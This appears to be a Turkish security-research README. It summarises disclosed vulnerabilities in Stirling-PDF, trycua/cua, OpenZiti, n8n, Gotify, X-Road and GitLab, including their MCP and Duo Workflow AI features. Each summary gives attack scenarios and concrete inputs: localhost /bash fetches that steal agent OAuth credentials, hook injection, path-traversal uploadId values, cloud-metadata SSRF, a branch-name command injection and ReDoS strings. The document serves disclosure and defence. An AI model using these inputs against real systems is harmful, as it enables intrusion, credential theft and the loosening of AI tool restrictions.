| **5. `codebase-memory-mcp`** | `32` eşik aşan (`SAST 17K/7Y`, `SCA 8Y`) | **`store.c:2864` SQLi, `c_lsp.h:54` yorum, `kotlin_lsp.c`/`py_lsp.c`/`store.c:4482` boyutlu tampon, `xmalloc.c` ve `mcp.c` yanlış pozitif**; `http_server.c` `localhost` CORS + `Host` (403) korumalı | **Düşük** | **HAYIR:** `http_server.c` yabancı origin'lere CORS başlığı dönmez ve DNS rebinding'i reddeder | **DÜŞÜK** *(Yerel kod sızıntısı zinciri geçersiz)* |
| **6. `gitlab-mcp-server`** | `5` eşik aşan (`0K / 4Y`) | `recorder.go` ve `make.go` yanlış pozitif; `GITLAB_MCP_SKIP_TLS_VERIFY=true` yalnızca kullanıcı seçerse aktif | **Düşük** | **HAYIR:** Birleşen bulgu yoktur | **DÜŞÜK** *(Opsiyonel ayar)* |
| **7. `apktool-mcp`** | `16` eşik aşan (`SAST 1 Orta`, `SCA 4K / 12Y`) | SAST gizlilik uyarıları yanlış pozitif; **`uv.lock` içinde 4 kritik, 12 yüksek SCA bağımlılık kaydı var** | **Düşük / Orta (SCA)** | **HAYIR:** Doğrulanmış birinci-parti kod zinciri yoktur; bağımlılık güncellemeleri incelenmelidir | **DÜŞÜK / ORTA (SCA)** *(SAST temiz, SCA kayıtları mevcut)* |
| **8. `jadx-mcp`** | `32` eşik aşan (`SAST 3 Orta`, `SCA 6K / 26Y`) | Doğrulanmış kritik/yüksek SAST açığı yok; **`uv.lock` içinde 6 kritik, 26 yüksek SCA bağımlılık kaydı var** | **Düşük / Orta (SCA)** | **HAYIR:** Doğrulanmış birinci-parti kod zinciri yoktur; bağımlılık güncellemeleri incelenmelidir | **DÜŞÜK / ORTA (SCA)** *(SAST kritik/yüksek yok, SCA kayıtları mevcut)* |

---

## Bölüm III — Kendi Sniper Taramamızda Bulduğumuz Doğrulanmış Açıklar (46 Doğrulanmış Güvenlik Kaydı (45 Özgün Açık + 1 Üst Akış Duplicate), Zafiyete Dönüşüm Mekanizmaları, Senaryolar ve Örnek Çalıştırma Komutları)

**Sniper** statik/dinamik analiz motoru ile yürüttüğümüz güvenlik taramalarında tespit edilen, **Adım Adım Günlük Hayat Kritik Senaryoları (`Senaryo A / B / C`)**, **Uçtan Uca Çalışma Zamanı Kanıtları (`RED -> GREEN + BENIGN`)** ve **Doğrulanmış Savunma Yamaları (`git diff`)** ile kanıtlanan **46 güvenlik kaydı (45 özgün açık + 1 üst akış duplicate)** ([advisories/README.tr.md](advisories/README.tr.md)) aşağıda önce özet tablo halinde, hemen ardından ise **her bir açığın kodda nasıl oluştuğunu, adım adım nasıl zafiyete dönüştüğünü, 3 günlük hayat kritik senaryosunu ve örnek çalıştırma/doğrulama komutlarını** içeren kapsamlı teknik bölümler (`III.01` – `III.46`) halinde sunulmuştur:

| # | Açık / Advisory & GHSA Bağlantısı | Hedef Proje & Bileşen | CWE & CVSS v3.1 | Günlük Hayatta Yol Açtığı Kritik Senaryolar (`Senaryo A / B / C`) | Çalışma Zamanı Kanıtı (`RED -> GREEN`) |
| :-: | :--- | :--- | :--- | :--- | :--- |
| **01** | [`01-STIRLING-CAND-02-SYMLINK.md`](advisories/tr/01-STIRLING-CAND-02-SYMLINK.md)<br/>`GHSA-hpc7-xx5r-gc44` | **Stirling-Tools/Stirling-PDF** (`v3.2.2`)<br/>`FolderInputSource.java:337-377`<br/>`FolderOutputSink.java:338-345` | `CWE-59` / `CWE-61`<br/>**7.1 High** | **A)** Ortak SMB/NFS tarayıcı klasörüne bırakılan `invoice.pdf -> /configs/settings.yml` sembolik bağı, varsayılan `recursive=false` modunda `FolderAccessGuard` kontrolünü aşarak admin/OAuth/SMTP sırlarını çıktı klasörüne sızdırır.<br/>**B)** Otomatik SFTP/Nextcloud belge aktarım hattında bırakılan sembolik bağ üzerinden `FolderOutputSink.archiveOriginal()` konak SSH anahtarlarını veya `.env` dosyalarını arşiv klasörüne kopyalar/taşır.<br/>**C)** Çok kiracılı (multi-tenant) departman klasörlerinde bir departman, komşu departmanın özel sözleşme/maaş bordrosu dizinine sembolik bağ vererek yetkisiz belge okuma ve silme gerçekleştirir. | `RED`: `symlink_accepted: true, protected_settings_exfiltrated: true`<br/>`GREEN`: `symlink_accepted: false, regular_file_processed: true` |
| **02** | [`02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/tr/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)<br/>`GHSA-ff6j-8xch-j8r6`<br/>*(`CVE-2026-71270` Eksik Yaması)* | **Stirling-Tools/Stirling-PDF** (`v3.2.2`)<br/>`ConvertWebsiteToPDF.java:116-143` | `CWE-918`<br/>**8.6 High** | **A)** Fatura/makbuz URL-to-PDF özelliğine verilen dış web sayfasındaki `<link rel="stylesheet" href="http://127.0.0.1:.../secrets.css">` veya `169.254.169.254` bulut IAM alt kaynağı WeasyPrint tarafından çekilip doğrudan üretilen PDF içine basılır.<br/>**B)** Java katmanındaki `SsrfProtectionService` yalnızca ana URL'yi denetlerken, WeasyPrint alt süreci `@import url("http://10.0.0.12:9090/metrics")` ile Kubernetes/Docker iç ağındaki mikroservisleri tarar.<br/>**C)** Çok aşamalı HTTP `302` yönlendirmesi kullanan bir `<img src="...">` veya `<link>` alt kaynağı ile güvenlik duvarı arkasındaki iç yönetim panellerinin yanıtları PDF olarak dışarı sızdırılır. | `RED`: `weasyprint_allowed_protocols: "data,http,https", internal_data_embedded_in_pdf: true`<br/>`GREEN`: `weasyprint_allowed_protocols: "data", internal_loopback_hit_count: 0` |
| **03** | [`03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/tr/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)<br/>`GHSA-cp36-x5hg-3gg8` | **trycua/cua** (`npm: cuabot <= 1.0.16`)<br/>`libs/cuabot/src/cuabotd.ts` | `CWE-306` / `CWE-942`<br/>**9.6 Critical** | **A)** Geliştirici `npx cuabot` açıkken herhangi bir web sitesini ziyaret ettiğinde, sayfadaki JS kodu `fetch("http://localhost:7842/bash")` (`Access-Control-Allow-Origin: *`) ile komut çalıştırıp bağlanmış `~/.cuabot/user/.claude/.credentials.json` OAuth anahtarlarını çalar.<br/>**B)** Aynı çapraz kökenli `POST /bash` veya `ws://localhost:7842/?command=...` (CSWSH) üzerinden yazılabilir `/home/community-user/.claude/settings.json` dosyasına kalıcı `PreToolUse` kancası (hook) enjekte edilir.<br/>**C)** `0.0.0.0:7842` bağlaması yüzünden kafe/ofis Wi-Fi ağındaki herhangi bir cihaz parola olmadan `/bash` ve `/screenshot` uç noktalarını çağırıp geliştiricinin ekranını izler ve komut çalıştırır. | `RED`: `http_status: 200, mounted_host_claude_credentials_exfiltrated: true`<br/>`GREEN`: `http_status: 403`<br/>`BENIGN`: `http_status: 200` |
| **04** | [`04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/tr/04-CUA-CAND-02-WORKER-SERVER-RCE.md)<br/>`GHSA-xm8w-gj3g-4f25` | **trycua/cua** (`pip: cua-bench-rl <= 0.1.0`)<br/>`worker_server.py:79-108, 338-360`<br/>`cua_bench/core.py:25-51` | `CWE-94` / `CWE-942`<br/>**8.8 High** | **A)** RL eğitimi yapan araştırmacı tarayıcıda gezinirken ziyaret ettiği bir sayfa `http://127.0.0.1:8001/reset` (`allow_origins=["*"]`) çağrısıyla `ip_filter_middleware` kontrolünü geçer ve `spec.loader.exec_module` ile konakta keyfi `<env_path>/main.py` çalıştırır.<br/>**B)** Kubernetes/Docker Compose dağıtımında `OSGYM_ALLOWED_IPS=""` boş verildiğinde `if allowed_ips:` kontrolü fail-open olur ve `0.0.0.0:8001` tüm ağa kimlik doğrulamasız RCE açar.<br/>**C)** Ağdaki veya tarayıcıdaki saldırgan `GET /screenshot` ve `POST /step` uç noktalarını kullanarak aktif masaüstü oturumunun ekran görüntülerini toplar ve klavye/fare komutları enjekte eder. | `RED`: `cross_origin_reset_status: 200, arbitrary_env_path_exec_module_rce: true`<br/>`GREEN`: `403 / 400, rce: false`<br/>`BENIGN`: `200` |
| **05** | [`05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/tr/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)<br/>`GHSA-3x8g-6h2v-8qx9` | **trycua/cua** (`cargo: cua-compat <= 0.8.0`)<br/>`daytona/objectstore.rs:320-422` | `CWE-22`<br/>**8.1 High** | **A)** Tek bir sandbox kiracısı, önceden multipart yükleme başlatmadan `DELETE /daytona/dummy?uploadId=../objects` isteği göndererek `tokio::fs::remove_dir_all` ile tüm organizasyonun `objects/` imaj deposunu tek hamlede siler.<br/>**B)** `?uploadId=../../state` veya `?uploadId=../../db` parametresiyle `d.objects.root` dışına çıkılarak `cua-spacesd` sürecinin yazma yetkisi olan konak uygulama dizinleri silinir.<br/>**C)** `PUT /daytona/key?partNumber=1&uploadId=../stage` isteğiyle çok parçalı yükleme parçaları `uploads/` dışındaki komşu uygulama dizinlerine yazılarak dosya sistemi kirletilir. | `RED`: `delete_traversal_status: 204, objects_store_wiped_without_prior_upload: true`<br/>`GREEN`: `400 / 404, objects_store_preserved: true` |
| **06** | [`06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/tr/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)<br/>`GHSA-54v9-fxw3-36mm` | **trycua/cua** (`cargo: cua-media-codec <= 0.8.0`)<br/>`videotoolbox/mod.rs:308-420` | `CWE-125` / `CWE-190`<br/>**5.5 Medium** | **A)** macOS uzak masaüstü yayınında pencere/çözünürlük değişimi sırasında gelen kısa `FrameData::Nv12` dilimi sınır kontrolsüz `unsafe { std::ptr::copy_nonoverlapping }` ile okunur; bitişik heap belleğindeki `960` bayt (oturum anahtarları/sırlar) H.264 video karesine kopyalanıp izleyicilere yayınlanır.<br/>**B)** Safe Rust `VtEncoder::encode` metoduna boş veya kısa `NV12`/`BGRA` dilimi verildiğinde eşlenmemiş (unmapped) bellek okunarak `cua-spacesd` medya sunucusu `SIGSEGV` ile çöker.<br/>**C)** Bozuk `y_stride` / `uv_stride` veya `stride * (h - 1)` aritmetiği verildiğinde satır adımları tampon sınırını aşarak çok kiracılı medya sürecinde bellek bozulmasına ve servis kesintisine yol açar. | `RED`: `oob_bytes_read: 960, adjacent_heap_secret_copied_to_video_frame: true`<br/>`GREEN`: `oob_bytes_read: 0, CodecError::InvalidArgument` |
| **07** | [`07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/tr/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)<br/>`GHSA-hvhg-6x47-cq96` | **trycua/cua** (`pip: cua-bench <= 0.3.1`)<br/>`winarena_adapter/cli.py:262-265`<br/>`infra/vm/setup/server/main.py` | `CWE-668` / `CWE-732`<br/>**8.6 High** | **A)** Üniversite/şirket laboratuvar ağında çalışan WinArena iş istasyonunun `0.0.0.0:8006` (şifresiz noVNC) ve `0.0.0.0:3390` (parolasız RDP) portlarına aynı LAN'daki herhangi biri bağlanıp Windows VM masaüstünü ve içindeki API anahtarlarını ele geçirir.<br/>**B)** Saldırgan ele geçirdiği VM içinden yazılabilir `-v {setup_path}:/shared` bağlamasını kullanarak konak makinedeki `winarena_adapter/infra/vm/setup` betiklerini zehirler.<br/>**C)** VM içindeki `0.0.0.0:5000` kontrol sunucusunun kimlik doğrulamasız `POST /execute_windows` (`exec()`) ve `POST /setup/launch` (`shell=True`) uç noktaları üzerinden ajan veya yerel ağ trafiğiyle rastgele işletim sistemi komutları çalıştırılır. | `RED`: `lan_exposed_ports: ["8006:8006", "3390:3389"], host_setup_dir_mounted_writable: true`<br/>`GREEN`: `lan_exposed_ports: [], host_setup_dir_mounted_writable: false` |
| **08** | [`08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/tr/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)<br/>`GHSA-qwv8-hh9r-cqrf` | **openziti/ziti** (`github.com/openziti/ziti/v2`)<br/>`ziti/util/certs.go:91-103, 199-208` | `CWE-295`<br/>**7.4 High** | **A)** DevOps mühendisi Wi-Fi/VPN üzerinden `ziti edge login` çalıştırdığında, `AreCertsTrusted` -> `InsecureClient` içindeki koşulsuz `InsecureSkipVerify: true` yüzünden sahte MITM sertifikası *"Verified that server supplied certificates are trusted"* mesajıyla kabul edilir ve admin parolası saldırgana gönderilir.<br/>**B)** Otomatik CI/CD ve Kubernetes başlangıç (bootstrap) iş akışlarında `ziti edge login` sahte veya ele geçirilmiş bir Edge Controller'a güvenerek kimlik ve yönlendirici politikalarını saldırgana kaydeder.<br/>**C)** Çoklu ortam geçişlerinde süresi dolmuş, iptal edilmiş veya yanlış CA tarafından imzalanmış denetleyici sertifikaları hiçbir uyarı üretmeden güvenilir kabul edilerek sıfır-güven (Zero-Trust) PKI zinciri kırılır. | `RED`: `rogue_mitm_cert_accepted_as_trusted: true, admin_credentials_sent_to_mitm: true`<br/>`GREEN`: `x509.UnknownAuthorityError` |
| **09** | [`09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/tr/09-N8N-CAND-01-WEBHOOK-REDOS.md)<br/>`n8n-workflow <= 2.45.0` | **n8n-io/n8n** (`npm: n8n-workflow <= 2.45.0`)<br/>`string-extensions.ts:59, 94, 326, 375, 383` | `CWE-1333`<br/>**5.3 Medium** | **A)** Halka açık iletişim/kayıt formu n8n Webhook uç noktasına (`{{$json.body.contact.isEmail()}}`) gönderilen 20 KB'lık tek bir `"a.a.a...a@!"` isteği Node.js ana olay döngüsünü ~832 ms kilitler; 10 eşzamanlı istek tüm Stripe/Slack webhook'larını ve n8n arayüzünü dondurur.<br/>**B)** Gelen destek e-postalarını veya sohbet mesajlarını ayrıştıran `{{$json.text.extractEmail()}}` otomasyon hattı, bozuk noktalı metin içeren tek bir mesajla kilitlenerek konteyner sağlık kontrolü (health-check) yeniden başlatma döngüsüne girer.<br/>**C)** CRM veri zenginleştirme iş akışlarında `{{$json.url.extractDomain()}}` (`DOMAIN_EXTRACT_REGEXP`) çalıştırıldığında uzun noktalı URL yükleri tek iş parçacıklı V8 çalışma zamanını tüketir. | `RED`: `regex_stall_ms: 165.035 (831.78ms @ 20KB), concurrent_webhook_starved: true`<br/>`GREEN`: `regex_stall_ms: 0.017 (0.0029ms)` |
| **10** | [`10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/tr/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)<br/>`GHSA-cc9f-m5vr-pm75` | **gotify/server** (`v2.9.1`)<br/>`router/router.go:52-73, 93-102` | `CWE-601`<br/>**4.7 Medium** | **A)** `SSL.RedirectToHTTPS=true` açıkken sahte `Host: attacker-gotify.example.com` başlığıyla yapılan istek `HTTP/1.1 308 Permanent Redirect` ile saldırganın alan adına yönlendirilir; tarayıcı yönlendirmeyi kalıcı önbelleğe alır ve URL'deki `?token=` sızar.<br/>**B)** HTTP uç noktasına `?token=<app-token>` ile bildirim gönderen izleme betikleri (`curl -L`, Python `requests`, Uptime Kuma) `308` yönlendirmesini takip ederek uygulama anahtarını saldırganın sunucusuna teslim eder.<br/>**C)** `Host` başlığını olduğu gibi ileten bir ters vekil veya paylaşımlı önbellek arkasında çalışan Gotify sunucusunda önbellek zehirlemesi (cache poisoning) ile tüm istemciler sahte giriş sayfasına yönlendirilir. | `RED`: `status_code: 308, redirected_to_untrusted_host: true`<br/>`GREEN`: `redirected_to_untrusted_host: false, bound_to_configured_ssl_host: true` |
| **11** | [`11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/tr/11-XROAD-CAND-01-RUNNER-INJECTION.md)<br/>`GHSA-4fcw-7xqx-fjv5` | **nordic-institute/X-Road** (`38cd99ec0ebb`)<br/>`.github/workflows/build.yaml`<br/>`_build-and-package.yml:84-91` | `CWE-78`<br/>**8.5 High** | **A)** `feat";<komut>;#` biçiminde hazırlanmış bir PR dal adı, henüz kod incelemesi veya `actions/checkout` çalışmadan kalıcı `xrd-runner-8c` self-hosted sunucusunda `_build-and-package.yml` içindeki bash betiğinde rastgele komut çalıştırır.<br/>**B)** `build.yaml` iş akışı `permissions: contents: write, packages: write` ve `secrets: inherit` ile `_build-and-package.yml`'ı çağırdığından, enjekte edilen komut GHCR paket yazma ve depo yazma yetkili `GITHUB_TOKEN`'ı ele geçirir.<br/>**C)** `xrd-runner-8c` geçici bir sanal makine değil kalıcı bir self-hosted sunucu olduğu için, saldırgan sonraki resmi X-Road sürüm derlemelerini zehirleyecek kalıcı arka plan süreci veya Gradle/Docker önbellek değişikliği bırakabilir. | `RED`: `direct_yaml_interpolation: true, arbitrary_command_executed_on_self_hosted_runner: true`<br/>`GREEN`: `env_var_parameterized: true, arbitrary_command_executed_on_self_hosted_runner: false` |
| **12** | [`12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md`](advisories/tr/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md)<br/>`GITLAB-CAND-02`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`app/controllers/oauth/device_authorizations_controller.rb:4-50`<br/>`app/controllers/oauth/tokens_controller.rb:42-75` | `CWE-863 / CWE-285`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` | **Kodda Oluşumu:** `Oauth::DeviceAuthorizationsController` (`device_authorizations_controller.rb:4-50`) ve `Oauth::TokensController` (`tokens_controller.rb:42-75`), kardeş `Oauth::AuthorizationsController` içinde zorunlu olan `verify_admin_allowed!`, `verify_confirmed_email!`, `set_current_organization` ve `enforce_organization_maintenance_mode` kontrollerini içermez.<br/>**Senaryo A (Tam Sunucu / Admin Ele Geçirme):** Normal kullanıcının oluşturduğu güvenilmeyen (`trusted: false`) uygulama, `disable_admin_oauth_scopes=true` açıkken bile `/oauth/device` üzerinden tam yetkili `api admin_mode` jetonu üreterek tüm özel depoların, CI/CD sırlarının ve GitLab sunucusunun ele geçirilmesini sağlar.<br/>**Senaryo B (E-Posta Onaysız Kalıcı API Arka Kapısı):** E-postası doğrulanmamış (`confirmed_at: nil`) hesap `/oauth/device` üzerinden kalıcı `access_token` ve `refresh_token` alır.<br/>**Senaryo C (Adli İnceleme / Göç Kilidinde Dondurulmuş Depoya Kod Enjeksiyonu):** Organizasyon `migration` (`503`) veya `legal` (`403`) bakım kilidindeyken cihaz token basılır ve dondurulmuş depoya commit (`201 Created`) atılır. | `RED`: `token_minted_admin_mode: true, post_token_admin_action_succeeded: true`<br/>`GREEN`: `503 / 403, token_minted_admin_mode: false`<br/>`pytest -k test_report1_cand02` |
| **13** | [`13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md`](advisories/tr/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md)<br/>`GITLAB-CAND-05`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`ee/app/services/ai/catalog/mcp_servers/callback_service.rb:17-50, 87-129`<br/>`refresh_token_service.rb:18-70`<br/>`dynamic_registration_client.rb:104-136` | `CWE-918 / CWE-209`<br/>**8.5 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` | **Kodda Oluşumu:** `CallbackService`, `RefreshTokenService`, `RevokeTokenService` ve `DynamicRegistrationClient`, RFC 8414 `token_endpoint`/`revocation_endpoint` adreslerini doğrulamaz ve `UrlBlocker` olmayan `OAuth2::Client` (`max_redirects: 5`) kullanarak `OAuth2::Error` gövdelerini `flash[:alert]` içine yansıtır.<br/>**Senaryo A (Bulut IAM Anahtarlarının `flash[:alert]` İle Çalınması):** `token_endpoint` üzerindeki `307` yönlendirmesiyle `169.254.169.254` / `127.0.0.1` hedeflerine ulaşılır ve bulut IAM yetki anahtarları doğrudan `flash[:alert]` içinde ekrandan okunur.<br/>**Senaryo B (İç Ağa `POST` SSRF ve Sır Sızıntısı):** `POST` gövdesindeki `client_secret` ve `refresh_token` güvenlik duvarı arkasındaki iç servise iletilir.<br/>**Senaryo C (`RevokeTokenService` SSRF):** Bağlantı kesilirken Basic Auth bilgileri doğrulanmamış `revocation_endpoint` adresine gönderilir. | `RED`: `canary_b_request_count: 5, iam_role_credentials_exposed: true`<br/>`GREEN`: `canary_b_request_count: 0, iam_role_credentials_exposed: false`<br/>`pytest -k test_report2_cand05` |
| **14** | [`14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md`](advisories/tr/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md)<br/>`GITLAB-CAND-06`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`ee/app/controllers/oauth/mcp_connectors_auth_controller.rb:16-78`<br/>`ee/app/services/ai/catalog/mcp_servers/connect_service.rb:16-79`<br/>`ee/lib/gitlab/oauth/client_state.rb:17-23` | `CWE-639 / CWE-862`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` | **Kodda Oluşumu:** `Oauth::McpConnectorsAuthController` `.in_organization(Current.organization)` olmadan global `McpServer.find` çağırır, `ConnectService` `update_ai_catalog_mcp_server` kontrolü yapmadan DCR kimlik bilgilerini yazar ve `ClientState.from_state` `data` bağlamasını düşürür.<br/>**Senaryo A (Rakip Organizasyonun AI Konnektörünü Ele Geçirme):** Organizasyon A'daki saldırgan Organizasyon B'ye ait `McpServer` kaydının `oauth_client_id` ve `oauth_client_secret` bilgilerini kendi OAuth istemcisiyle ezer.<br/>**Senaryo B (Salt-Okunur Kullanıcının Üretim Ayarlarını Ezmesi):** Yalnızca okuma yetkili kullanıcı şirketin MCP OAuth kimlik bilgilerini değiştirir.<br/>**Senaryo C (Kurban Oturumunu Saldırganın MCP Hesabına Bağlama):** Bağlanmamış `state` jetonuyla kurban geliştiricinin GitLab hesabı saldırganın MCP hesabına bağlanır. | `RED`: `cross_org_server_mutated: true`<br/>`GREEN`: `cross_org_server_mutated: false (404 RecordNotFound)`<br/>`pytest -k test_report2_cand05` |
| **15** | [`15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md`](advisories/tr/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md)<br/>`GITLAB-CAND-01`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`workhorse/internal/ai_assist/duoworkflow/mcp.go:25-60, 101-112, 220-239` | `CWE-918 / CWE-522`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` | **Kodda Oluşumu:** `workhorse/internal/ai_assist/duoworkflow/mcp.go:41-44` içindeki `externalMcpTransport` `transport.WithSSRFFilter()` kullanmaz ve `roundTripper.RoundTrip` (`mcp.go:101-104`) her yönlendirme adımında `Authorization: Bearer` başlığını yeniden ekler.<br/>**Senaryo A (Canlı Bearer Token Hırsızlığı ve Özel Depo Ele Geçirme):** Harici MCP sunucusundan dönen `302` yönlendirmesinde kurbanın canlı `Authorization: Bearer` jetonu saldırgan sunucusuna sızdırılır.<br/>**Senaryo B (Workhorse İç Ağ ve Bulut Metadata SSRF):** Yönlendirme üzerinden Workhorse sürecinden `127.0.0.1` ve `169.254.169.254` adreslerine doğrudan bağlanılır.<br/>**Senaryo C (DNS Rebinding ile İç Ağa Sızma):** Soket seviyesinde `WithSSRFFilter` olmadığı için DNS Rebinding ile şirket iç ağına erişilir. | `RED`: `bearer_token_leaked_to_canary: true`<br/>`GREEN`: `bearer_token_leaked_to_canary: false, ssrfFilterError: disallowlist`<br/>`pytest -k test_report2_cand05` |
| **16** | [`16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md`](advisories/tr/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md)<br/>`GITLAB-CAND-08`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`ee/app/services/ai/duo_workflows/mcp_config_service.rb:131-135`<br/>`ee/lib/api/ai/duo_workflows/workflows.rb:341-344, 1065`<br/>`connection_config_service.rb:220-228` | `CWE-862 / CWE-639`<br/>**7.7 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` | **Kodda Oluşumu:** `McpConfigService#item_version` (`mcp_config_service.rb:134`) aynı dosyanın 334. satırında bulunan `Ability.allowed?(current_user, :read_ai_catalog_item, item_version)` kontrolünü atlar ve `workflows.rb:1065` (`GET /ws`) `workflow_definition` ile `ai_catalog_item_version_id` ezilmesine izin verir.<br/>**Senaryo A (Salt-Okunur `chat` Oturumundan Yazma Aracı Çalıştırma):** `/ws` üzerinde `workflow_definition` ve `ai_catalog_item_version_id` değiştirilerek yasaklı yazma araçları (`create_issue`) etkinleştirilir.<br/>**Senaryo B (Gizli `public: false` Ajan Yapılandırmasını Çalma):** Başka organizasyonlara ait özel AI ajanlarının araç listesi sızdırılır.<br/>**Senaryo C (Yetkisiz Özel Ajan Sürümü Bağlama):** `POST /workflows` ile özel ajan sürümleri yetki kontrolsüz bağlanır. | `RED`: `unapproved_write_tool_injected: true, workflow_definition_overridden: true`<br/>`GREEN`: `unapproved_write_tool_injected: false`<br/>`pytest -k test_report3_cand08` |
| **17** | [`17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md`](advisories/tr/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md)<br/>`GITLAB-CAND-07`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`ee/app/services/ai/duo_workflows/mcp_config_service.rb:57-64`<br/>`ee/app/services/ai/catalog/mcp_servers/list_service.rb:14-24`<br/>`workhorse/internal/ai_assist/duoworkflow/mcp.go:254` | `CWE-863 / CWE-639`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L` | **Kodda Oluşumu:** `McpConfigService#execute` (`mcp_config_service.rb:61`) `.except(:orbit)` kullanırken `:gitlab` anahtarını dışlamaz ve `ListService`/`Agent::Create` `.in_organization` kontrolü yapmaz.<br/>**Senaryo A (Tüm Yerleşik GitLab AI Araç Kısıtlamalarını Sıfırlama):** Adı `"GitLab"` (`:gitlab`, `Tools: nil`) olan katalog sunucusu yerleşik `:gitlab` kaydını ezerek Workhorse'ta (`mcp.go:254`) `allToolsAvailable = true` yapar ve tüm `withheld_server_tools` yasaklarını kaldırır.<br/>**Senaryo B (Başka Organizasyonun MCP Sunucusunu Bağlama):** GraphQL mutasyonlarıyla başka organizasyondaki `McpServer` GID'si ajana bağlanır.<br/>**Senaryo C (Duo Workflow `401` DoS):** `:gitlab` üzerindeki `Headers` ezilerek `/api/v4/mcp` çağrıları çökertilir. | `RED`: `builtin_gitlab_overwritten: true, workhorse_all_tools_available: true`<br/>`GREEN`: `builtin_gitlab_overwritten: false, workhorse_all_tools_available: false`<br/>`pytest -k test_report4_cand07` |
| **18** | [`18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md`](advisories/tr/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md)<br/>`GITLAB-CAND-04`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`app/controllers/projects/integrations/slash_commands_controller.rb:21-48`<br/>`app/models/concerns/integrations/base/slash_commands.rb:6-10, 68-76` | `CWE-601 / CWE-863`<br/>**5.4 Medium**<br/>`AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` | **Kodda Oluşumu:** `SlashCommandsController#confirm` (`slash_commands_controller.rb:23-48`) doğrulanmamış `request_params[:redirect_url]` adresine yönlendirme yapar, `request_params[:response_url]` kullanır ve Redis `CACHE_KEY` içinde `project_id`/`integration_id` bağlamaz.<br/>**Senaryo A (Güvenilir GitLab Onay Ekranı Üzerinden Şifre/2FA Avı):** Slash komutu onaylandığı anda kullanıcı `302 Found` ile harici sahte SSO giriş sayfasına yönlendirilir.<br/>**Senaryo B (Projeler Arası ChatOps Hesap Bağlama):** Proje B'de üretilen `command_id` Proje A'nın onay uç noktasında geçerli kabul edilir.<br/>**Senaryo C (ChatOps Geri Çağrı Yönlendirmesi):** `request_params[:response_url]` önbellekteki URL'nin yerine kullanılarak onay yanıtı saldırgana yönlendirilir. | `RED`: `http_status: 302, open_redirect_triggered: true, cross_project_cache_collision_accepted: true`<br/>`GREEN`: `404, open_redirect_triggered: false`<br/>`pytest -k test_report5_cand04` |
